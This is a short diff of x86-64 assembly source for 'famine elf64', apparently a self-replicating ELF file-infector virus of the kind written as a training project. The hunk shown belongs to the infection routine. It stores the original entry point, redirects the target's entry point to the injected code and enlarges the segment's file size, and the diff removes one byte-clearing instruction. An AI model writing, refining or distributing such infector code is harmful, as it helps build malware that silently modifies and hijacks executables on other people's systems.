@@ -1,4 +1,4 @@
-; famine elf64 - size 730 bytes
+; famine elf64 - size 726 bytes
 
 %include "famine.inc"
 
@@ -239,7 +239,6 @@ insert_elf64:                                                   ; expecting data
                 mov         rax, qword [r15 + 0x18]             ; entry point
                 mov         qword [rdi - 8], rax                ; _finish - 8 = entry
                 mov         qword [rdi - 16], r13               ; _finish - 16 = pie_address
-                mov         byte [rdi - 17], 0
                 mov         qword [r15 + 0x18], r13             ; fix entry point
                 mov         rax, _finish - _start
                 add         qword [r14 + 0x20], rax             ; increase p_filesz
